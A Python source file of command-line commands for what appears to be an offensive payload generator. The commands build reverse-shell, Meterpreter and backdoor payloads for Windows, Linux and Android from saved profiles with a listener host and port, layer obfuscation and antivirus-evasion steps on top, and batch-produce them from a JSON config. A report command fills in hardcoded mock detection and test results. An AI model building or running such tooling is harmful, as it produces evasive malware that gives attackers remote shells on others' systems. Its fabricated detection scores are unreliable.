"""
Additional CLI improvements and new commands
Add these to cli.py for enhanced functionality
"""
import click
import json
from pathlib import Path
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm

from utils.helpers import (
    get_analyzer,
    get_config_manager,
    get_report_generator,
    get_batch_processor,
    get_payload_factory,
    get_obfuscator,
)

# Initialize console for rich output
console = Console()


# Note: These commands should be added to an existing Click CLI group
# To use them, either:
# 1. Copy these functions into your main cli.py file after the @click.group() definition
# 2. Or import them and add to your CLI group
# 
# Example integration in cli.py:
# from cli_improvements import analyze, save_profile, use_profile, list_profiles, report, batch_from_config


@cli.command()
@click.option("--payload", "-p", required=True, type=click.Path(exists=True))
@click.option("--output", "-o", help="Output file for analysis report")
def analyze(payload, output):
    """Analyze a payload file"""
    
    console.print(f"[bold]Analyzing payload: {payload}[/bold]\\n")
    
    try:
        # Read payload
        with open(payload, 'rb') as f:
            payload_bytes = f.read()
        
        # Analyze
        analyzer = get_analyzer()
        analysis = analyzer.analyze_payload(payload_bytes)
        
        # Display results
        table = Table(title="Payload Analysis", show_header=True, header_style="bold cyan")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="white")
        
        table.add_row("Size", f"{analysis['size']:,} bytes")
        table.add_row("Entropy", f"{analysis['entropy']:.4f}")
        table.add_row("File Type", analysis['file_type'])
        table.add_row("MD5", analysis['md5'])
        table.add_row("SHA1", analysis['sha1'])
        table.add_row("SHA256", analysis['sha256'])
        
        console.print(table)
        
        # Suspicious indicators
        if analysis['suspicious']:
            console.print("\\n[yellow]⚠ Suspicious Indicators:[/yellow]")
            for indicator in analysis['suspicious']:
                console.print(f"  • {indicator}")
        else:
            console.print("\\n[green]✓ No suspicious indicators detected[/green]")
        
        # Save to file if requested
        if output:
            import json
            with open(output, 'w') as f:
                json.dump(analysis, f, indent=2)
            console.print(f"\\n[green]Analysis saved to: {output}[/green]")
        
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise click.ClickException(str(e))


@cli.command()
@click.option("--name", "-n", required=True, help="Profile name")
@click.option("--type", "-t", help="Payload type")
@click.option("--target", help="Target OS")
@click.option("--obfuscation-level", type=int, help="Obfuscation level")
def save_profile(name, type, target, obfuscation_level):
    """Save a configuration profile"""
    
    config = {}
    
    if type:
        config['payload_type'] = type
    if target:
        config['target_os'] = target
    if obfuscation_level:
        config['obfuscation_level'] = obfuscation_level
    
    # Interactive prompts for missing values
    if not config:
        console.print("[yellow]No configuration provided. Starting interactive setup...[/yellow]\\n")
        
        config['payload_type'] = Prompt.ask(
            "Payload type",
            choices=["reverse_shell", "meterpreter", "backdoor"],
            default="reverse_shell"
        )
        config['target_os'] = Prompt.ask(
            "Target OS",
            choices=["windows", "linux", "android"],
            default="windows"
        )
        config['obfuscation_level'] = int(Prompt.ask(
            "Obfuscation level (1-5)",
            default="3"
        ))
        config['use_evasion'] = Confirm.ask("Use evasion techniques?", default=True)
        config['use_ml'] = Confirm.ask("Use ML obfuscation?", default=False)
    
    try:
        manager = get_config_manager()
        manager.save_profile(name, config)
        
        console.print(f"[green]✓ Profile '{name}' saved successfully![/green]")
        
        # Display saved config
        table = Table(show_header=False, box=None)
        for key, value in config.items():
            table.add_row(f"{key}:", str(value))
        console.print(table)
        
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise click.ClickException(str(e))


@cli.command()
@click.option("--name", "-n", required=True, help="Profile name")
@click.option("--lhost", required=True, help="Listener host")
@click.option("--lport", type=int, required=True, help="Listener port")
@click.option("--output", "-o", required=True, help="Output filename")
def use_profile(name, lhost, lport, output):
    """Generate payload using a saved profile"""
    
    console.print(f"[bold]Loading profile: {name}[/bold]\\n")
    
    try:
        # Load profile
        manager = get_config_manager()
        config = manager.load_profile(name)
        
        # Display config
        console.print("[cyan]Profile Configuration:[/cyan]")
        table = Table(show_header=False, box=None)
        for key, value in config.items():
            table.add_row(f"{key}:", str(value))
        console.print(table)
        console.print()
        
        # Generate payload
        factory = get_payload_factory()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console,
        ) as progress:
            task = progress.add_task("[cyan]Generating payload...", total=100)
            
            # Generate based on profile
            payload_type = config.get('payload_type', 'reverse_shell')
            
            if payload_type == "reverse_shell":
                payload, metadata = factory.generate_reverse_shell_tcp(
                    lhost=lhost,
                    lport=lport,
                    target_os=config.get('target_os', 'windows'),
                )
            elif payload_type == "meterpreter":
                payload, metadata = factory.generate_meterpreter_payload(
                    lhost=lhost,
                    lport=lport,
                    target_os=config.get('target_os', 'windows'),
                )
            else:
                raise ValueError(f"Unsupported payload type: {payload_type}")
            
            progress.update(task, advance=50)
            
            # Apply obfuscation if configured
            if config.get('obfuscation_level', 0) > 0:
                obfuscator = get_obfuscator()
                payload, obf_meta = obfuscator.obfuscate_payload(
                    payload,
                    level=config['obfuscation_level']
                )
                metadata['obfuscation'] = obf_meta
            
            progress.update(task, advance=30)
            
            # Apply evasion if configured
            if config.get('use_evasion', False):
                from evasion.evasion_techniques import get_evasion_orchestrator
                evasion = get_evasion_orchestrator()
                payload, evasion_meta = evasion.apply_all_evasions(payload)
                metadata['evasion'] = evasion_meta
            
            progress.update(task, advance=20)
            
            # Save
            output_path = factory.save_payload(payload, output, metadata)
        
        console.print(f"\\n[bold green]✓ Payload generated using profile '{name}'![/bold green]")
        console.print(f"Output: [cyan]{output_path}[/cyan]")
        console.print(f"Size: {len(payload):,} bytes")
        
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise click.ClickException(str(e))


@cli.command()
def list_profiles():
    """List all saved configuration profiles"""
    
    try:
        manager = get_config_manager()
        profiles = manager.list_profiles()
        
        if not profiles:
            console.print("[yellow]No profiles found.[/yellow]")
            console.print("Create one with: [cyan]python cli.py save-profile --name myprofile[/cyan]")
            return
        
        console.print(f"[bold]Available Profiles ({len(profiles)}):[/bold]\\n")
        
        table = Table(show_header=True, header_style="bold cyan")
        table.add_column("#", style="dim")
        table.add_column("Profile Name", style="cyan")
        table.add_column("Details", style="white")
        
        for i, profile_name in enumerate(profiles, 1):
            try:
                config = manager.load_profile(profile_name)
                details = (f"Type: {config.get('payload_type', 'N/A')}, "
                          f"Target: {config.get('target_os', 'N/A')}, "
                          f"Obf Level: {config.get('obfuscation_level', 'N/A')}")
                table.add_row(str(i), profile_name, details)
            except:
                table.add_row(str(i), profile_name, "[red]Error loading[/red]")
        
        console.print(table)
        console.print("\\n[dim]Use with: python cli.py use-profile --name <profile>[/dim]")
        
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise click.ClickException(str(e))


@cli.command()
@click.option("--payload", "-p", required=True, type=click.Path(exists=True))
@click.option("--metadata", "-m", type=click.Path(exists=True), help="Metadata JSON file")
@click.option("--output", "-o", default="report.html", help="Output HTML file")
def report(payload, metadata, output):
    """Generate HTML report for a payload"""
    
    console.print(f"[bold]Generating report for: {payload}[/bold]\\n")
    
    try:
        # Read payload
        with open(payload, 'rb') as f:
            payload_bytes = f.read()
        
        # Analyze payload
        analyzer = get_analyzer()
        analysis = analyzer.analyze_payload(payload_bytes)
        
        # Load metadata if provided
        import json
        payload_info = {'final_size': len(payload_bytes)}
        
        if metadata:
            with open(metadata, 'r') as f:
                payload_info = json.load(f)
        
        # Mock detection and functionality results for demo
        detection_results = {
            'detection_score': 0.3,
            'payload_hash': analysis['md5'],
            'local_analysis': {'entropy': analysis['entropy']},
        }
        
        functionality_results = {
            'tests_passed': 5,
            'tests_failed': 0,
        }
        
        # Generate report
        generator = get_report_generator()
        generator.generate_html_report(
            payload_info,
            detection_results,
            functionality_results,
            output
        )
        
        console.print(f"[bold green]✓ HTML report generated![/bold green]")
        console.print(f"Output: [cyan]{output}[/cyan]")
        console.print(f"\\n[dim]Open in browser to view detailed analysis[/dim]")
        
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise click.ClickException(str(e))


@cli.command()
@click.option("--config", "-c", required=True, type=click.Path(exists=True),
              help="JSON file with batch configurations")
@click.option("--output-dir", "-o", default="batch_output", help="Output directory")
def batch_from_config(config, output_dir):
    """Generate multiple payloads from configuration file"""
    
    console.print(f"[bold]Processing batch from: {config}[/bold]\\n")
    
    try:
        import json
        
        # Load configurations
        with open(config, 'r') as f:
            configs = json.load(f)
        
        if not isinstance(configs, list):
            raise ValueError("Configuration file must contain a JSON array")
        
        console.print(f"Found {len(configs)} configurations\\n")
        
        # Process batch
        processor = get_batch_processor()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("[cyan]Processing batch...", total=len(configs))
            
            results = processor.process_batch(configs, output_dir)
            
            progress.update(task, completed=len(configs))
        
        # Display results
        successful = sum(1 for r in results if r.get('success', False))
        failed = len(results) - successful
        
        console.print(f"\\n[bold]Batch Processing Complete![/bold]")
        console.print(f"  [green]✓ Successful: {successful}[/green]")
        if failed > 0:
            console.print(f"  [red]✗ Failed: {failed}[/red]")
        
        console.print(f"\\nOutput directory: [cyan]{output_dir}/[/cyan]")
        console.print(f"Results saved to: [cyan]{output_dir}/batch_results.json[/cyan]")
        
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise click.ClickException(str(e))


# Example batch configuration file (batch_config.json):
"""
[
  {
    "lhost": "192.168.1.10",
    "lport": 4444,
    "target_os": "windows",
    "obfuscate": true,
    "obfuscation_level": 3
  },
  {
    "lhost": "192.168.1.10",
    "lport": 4445,
    "target_os": "linux",
    "obfuscate": true,
    "obfuscation_level": 5
  }
]
"""
